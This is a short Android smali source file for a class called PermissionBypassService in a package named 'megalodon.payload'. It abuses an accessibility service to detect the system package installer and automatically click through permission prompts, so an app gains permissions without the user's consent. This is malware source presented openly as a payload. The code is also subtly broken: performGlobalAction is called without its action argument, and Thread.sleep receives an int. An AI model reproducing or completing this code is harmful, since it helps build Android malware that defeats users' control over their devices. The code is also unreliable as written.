
.class public Lcom/megalodon/payload/PermissionBypassService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "PermissionBypassService.smali"

.field private static final TAG:Ljava/lang/String; = "Megalodon"

.method public onAccessibilityEvent(Landroid/accessibilityservice/AccessibilityEvent;)V
    .registers 8
    .param p1, "event"    # Landroid/accessibilityservice/AccessibilityEvent;
    
    const-string v0, "Megalodon"
    const-string v1, "Accessibility event triggered"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    
    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v0
    
    if-eqz v0, :cond_1a
    
    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v1
    
    if-eqz v1, :cond_1a
    
    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;
    move-result-object v2
    
    const-string v3, "com.android.packageinstaller"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    
    if-eqz v2, :cond_1a
    
    invoke-virtual {p0}, Lcom/megalodon/payload/PermissionBypassService;->autoGrantPermissions()V
    
    :cond_1a
    return-void
.end method

.method public autoGrantPermissions()V
    .registers 6
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/InterruptedException;
        }
    .end annotation
    
    const-string v0, "Megalodon"
    const-string v1, "Auto-granting permissions..."
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    
    const/16 v0, 0x64
    invoke-static {v0}, Ljava/lang/Thread;->sleep(I)V
    
    invoke-virtual {p0}, Lcom/megalodon/payload/PermissionBypassService;->performGlobalAction(I)Z
    
    const/16 v0, 0x64
    invoke-static {v0}, Ljava/lang/Thread;->sleep(I)V
    
    invoke-virtual {p0}, Lcom/megalodon/payload/PermissionBypassService;->performGlobalAction(I)Z
    
    const-string v0, "Megalodon"
    const-string v1, "Permissions granted"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    
    return-void
.end method

.method public onServiceConnected()V
    .registers 3
    const-string v0, "Megalodon"
    const-string v1, "Accessibility service connected"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method public onInterrupt()V
    .registers 3
    const-string v0, "Megalodon"
    const-string v1, "Accessibility service interrupted"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method
.end class
